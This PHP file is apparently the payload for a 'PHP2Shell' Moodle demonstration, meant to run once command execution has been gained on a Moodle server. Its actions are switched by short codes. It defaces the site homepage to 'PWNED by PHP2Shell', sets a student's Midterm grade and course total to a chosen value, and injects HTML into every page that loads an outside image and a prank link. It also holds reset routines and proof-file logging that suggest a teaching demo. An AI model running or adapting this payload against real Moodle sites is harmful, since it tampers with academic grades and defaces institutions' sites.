<?php
// Single instructor payload for the PHP2Shell Moodle demo.
//
// The instructor controller passes a compact code in argv[1], keeping
// `php /tmp/p <code>` within the 14-byte PoC command limit.
//
// Actions:
//   0: clear the previous HTTP proof
//   1: homepage; 2: reset-homepage
//   g<base36>: set an integer grade (for example g2s is 100)
//   5: good-hacker; 6: reset-good-hacker
//   7: self-check the payload without changing Moodle data
//
// This file is a demo payload, not a web endpoint. It reads the local Moodle
// config and only touches the fictional course, grade, and front-page values.

define('CLI_SCRIPT', true);
require('/var/www/html/config.php');
require_once($CFG->dirroot . '/course/lib.php');
require_once($CFG->dirroot . '/user/lib.php');
require_once($CFG->libdir . '/enrollib.php');
require_once($CFG->libdir . '/gradelib.php');
require_once($CFG->libdir . '/grade/grade_item.php');
require_once($CFG->libdir . '/grade/grade_grade.php');

$action = (string) ($argv[1] ?? '');
$imageUrl = 'https://s.xn--kst.tw/good-hacker.webp';
$imageUrlSafe = htmlspecialchars($imageUrl, ENT_QUOTES, 'UTF-8');
$proof = function (string $text): void {
    file_put_contents('/var/www/html/demo-proof.txt', $text . "\n");
    echo $text . "\n";
};
$fail = function (string $reason) use ($proof): void {
    $proof('demo=failed reason=' . preg_replace('/\s+/', ' ', $reason));
    exit(1);
};

try {
    switch ($action) {
        case '0':
            @unlink('/var/www/html/demo-proof.txt');
            break;

        case '1':
            $site = $DB->get_record('course', ['id' => 1], '*', MUST_EXIST);
            if (!get_config('core', 'lab_demo_homepage_saved')) {
                set_config('lab_demo_homepage_fullname', $site->fullname);
                set_config('lab_demo_homepage_shortname', $site->shortname);
                set_config('lab_demo_homepage_saved', 1);
            }
            $site->fullname = 'PWNED by PHP2Shell';
            $site->shortname = 'PWNED';
            $DB->update_record('course', $site);
            purge_caches();
            $check = $DB->get_record('course', ['id' => 1], '*', MUST_EXIST);
            if ($check->fullname !== 'PWNED by PHP2Shell') {
                $fail('homepage readback mismatch');
            }
            $proof('homepage=ok fullname=PWNED by PHP2Shell shortname=PWNED db=verified');
            break;

        case '2':
            $fullname = get_config('core', 'lab_demo_homepage_fullname');
            $shortname = get_config('core', 'lab_demo_homepage_shortname');
            $fullname = $fullname ?: 'NCKU Moodle';
            $shortname = $shortname ?: 'NCKU Moodle';
            $site = $DB->get_record('course', ['id' => 1], '*', MUST_EXIST);
            $site->fullname = $fullname;
            $site->shortname = $shortname;
            $DB->update_record('course', $site);
            unset_config('lab_demo_homepage_fullname');
            unset_config('lab_demo_homepage_shortname');
            unset_config('lab_demo_homepage_saved');
            purge_caches();
            $check = $DB->get_record('course', ['id' => 1], '*', MUST_EXIST);
            if ($check->fullname !== $fullname || $check->shortname !== $shortname) {
                $fail('homepage reset readback mismatch');
            }
            $proof("homepage-reset=ok fullname={$fullname} shortname={$shortname} db=verified");
            break;

        case '7':
            $proof('payload-check=ok sha256=' . hash_file('sha256', __FILE__));
            break;

        default:
            if (!preg_match('/^g([0-9a-z]{1,2})$/', $action, $match)) {
                $fail('unknown action code');
            }
            $value = (float) base_convert($match[1], 36, 10);
            $course = $DB->get_record('course', ['shortname' => 'OS'], '*', MUST_EXIST);
            $user = $DB->get_record('user', ['username' => 'p2s_student', 'deleted' => 0], '*', MUST_EXIST);
            $item = grade_item::fetch([
                'courseid' => $course->id,
                'itemtype' => 'manual',
                'itemname' => 'Midterm',
            ]);
            if (!$item) {
                $fail('Midterm grade item not found');
            }
            $grade = $DB->get_record('grade_grades', ['itemid' => $item->id, 'userid' => $user->id]);
            if (!$grade) {
                $grade = new grade_grade();
                $grade->itemid = $item->id;
                $grade->userid = $user->id;
                $grade->rawgrade = $value;
                $grade->finalgrade = $value;
                $grade->insert();
            } else {
                $grade->rawgrade = $value;
                $grade->finalgrade = $value;
                $grade->timemodified = time();
                $DB->update_record('grade_grades', $grade);
            }
            $item->force_regrading();
            grade_regrade_final_grades($course->id);
            $check = $DB->get_record('grade_grades', ['itemid' => $item->id, 'userid' => $user->id], '*', MUST_EXIST);
            $courseitem = grade_item::fetch_course_item($course->id);
            $coursetotal = $DB->get_record('grade_grades', ['itemid' => $courseitem->id, 'userid' => $user->id], '*', MUST_EXIST);
            if (abs((float) $check->finalgrade - $value) > 0.001
                || abs((float) $coursetotal->finalgrade - $value) > 0.001) {
                $fail('grade or course-total readback mismatch');
            }
            $proof(sprintf(
                'grade=ok course=OS item=Midterm student=p2s_student grade=%.2f course-total=%.2f db=verified',
                $value,
                (float) $coursetotal->finalgrade
            ));
            break;

        case '5':
            if (!get_config('core', 'lab_demo_good_hacker_top_saved')) {
                $previous = get_config('core', 'additionalhtmltopofbody');
                set_config('lab_demo_good_hacker_top_previous', is_string($previous) ? $previous : '');
                set_config('lab_demo_good_hacker_top_saved', 1);
            }
            $top = get_config('core', 'additionalhtmltopofbody');
            $top = is_string($top) ? $top : '';
            if (strpos($top, 'good-hacker.webp') !== false && strpos($top, $imageUrl) === false) {
                $fail('legacy local good-hacker image found; reset the old effect first');
            }
            if (strpos($top, $imageUrl) === false) {
                $top .= "\n<div style=\"text-align:center;margin:14px 0;\"><a href=\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" target=\"_blank\" rel=\"noopener\"><img src=\"{$imageUrlSafe}\" alt=\"Good hacker\" style=\"max-width:420px;width:100%;height:auto;border:0;border-radius:6px;\"></a></div>";
            }
            set_config('additionalhtmltopofbody', $top);
            purge_caches();
            $check = get_config('core', 'additionalhtmltopofbody');
            if (!is_string($check)
                || strpos($check, $imageUrl) === false
                || strpos($check, 'youtube.com/watch?v=dQw4w9WgXcQ') === false) {
                $fail('front-page image or link readback mismatch');
            }
            $proof('good-hacker=ok image=' . $imageUrl . ' link=youtube db=verified');
            break;

        case '6':
            if (!get_config('core', 'lab_demo_good_hacker_top_saved')) {
                $current = get_config('core', 'additionalhtmltopofbody');
                $fileleft = file_exists('/var/www/html/good-hacker.webp');
                $linkleft = is_string($current) && strpos($current, 'good-hacker.webp') !== false;
                if (!$fileleft && !$linkleft) {
                    $proof('good-hacker-reset=ok image=absent link=absent top=already-baseline db=verified');
                    break;
                }
                $fail('no saved top-of-page HTML, but the image/link is still present');
            }
            $previous = get_config('core', 'lab_demo_good_hacker_top_previous');
            set_config('additionalhtmltopofbody', is_string($previous) ? $previous : '');
            unset_config('lab_demo_good_hacker_top_previous');
            unset_config('lab_demo_good_hacker_top_saved');
            @unlink('/var/www/html/good-hacker.webp');
            purge_caches();
            $check = get_config('core', 'additionalhtmltopofbody');
            if (is_string($check) && strpos($check, 'good-hacker.webp') !== false) {
                $fail('front-page image link still present');
            }
            $proof('good-hacker-reset=ok image=absent link=absent top=restored db=verified');
            break;
    }
} catch (Throwable $e) {
    $fail($e->getMessage());
}
